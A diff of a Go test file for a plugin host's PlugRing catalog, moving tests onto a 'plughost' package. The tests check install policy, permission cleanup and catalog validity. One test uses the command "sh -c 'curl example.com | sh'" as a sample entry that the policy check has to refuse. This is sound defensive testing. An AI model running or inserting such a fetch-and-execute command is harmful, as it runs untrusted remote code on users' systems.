@@ -6,6 +6,7 @@ import (
 	"runtime"
 	"testing"
 
+	"github.com/unxed/f4/internal/plughost"
 	"gopkg.in/yaml.v3"
 )
 
@@ -13,22 +14,22 @@ import (
 // the policy check has to see it, so that an entry carrying one cannot reach
 // the installer unannounced.
 func TestSetupCmdIsRefusedByPolicy(t *testing.T) {
-	item := PlugRingItem{ID: "a", Entrypoint: "plugin.lua", SetupCmd: "sh -c 'curl example.com | sh'"}
-	problem := PlugRingItemProblem(item)
+	item := plughost.PlugRingItem{ID: "a", Entrypoint: "plugin.lua", SetupCmd: "sh -c 'curl example.com | sh'"}
+	problem := plughost.PlugRingItemProblem(item)
 	if problem == "" {
 		t.Fatal("an entry running a command at install time was accepted")
 	}
 }
 
 func TestRemovingAPluginDropsItsGrants(t *testing.T) {
-	store := LoadPermissionStore(filepath.Join(t.TempDir(), "perms.json"))
-	if err := store.Remember("notes", PermissionFFI, PermissionAllow); err != nil {
+	store := plughost.LoadPermissionStore(filepath.Join(t.TempDir(), "perms.json"))
+	if err := store.Remember("notes", plughost.PermissionFFI, plughost.PermissionAllow); err != nil {
 		t.Fatalf("Remember: %v", err)
 	}
 	if err := store.Forget("notes"); err != nil {
 		t.Fatalf("Forget: %v", err)
 	}
-	if _, ok := store.Decision("notes", PermissionFFI); ok {
+	if _, ok := store.Decision("notes", plughost.PermissionFFI); ok {
 		t.Error("a removed plugin kept the permissions it had been granted")
 	}
 }
@@ -52,7 +53,7 @@ func TestShippedCatalogMeetsItsOwnPolicy(t *testing.T) {
 		t.Fatalf("read the shipped PlugRing catalog: %v", err)
 	}
 
-	var items []PlugRingItem
+	var items []plughost.PlugRingItem
 	if err := yaml.Unmarshal(data, &items); err != nil {
 		t.Fatalf("the shipped catalog does not parse: %v", err)
 	}
@@ -61,10 +62,10 @@ func TestShippedCatalogMeetsItsOwnPolicy(t *testing.T) {
 	}
 
 	for _, item := range items {
-		if problem := PlugRingItemProblem(item); problem != "" {
+		if problem := plughost.PlugRingItemProblem(item); problem != "" {
 			t.Errorf("%q breaks the distribution policy: %s", item.ID, problem)
 		}
-		if ok, reason := PlugRingItemRunsHere(item); !ok {
+		if ok, reason := plughost.PlugRingItemRunsHere(item); !ok {
 			t.Errorf("%q cannot run on the build that ships it: %s", item.ID, reason)
 		}
 	}
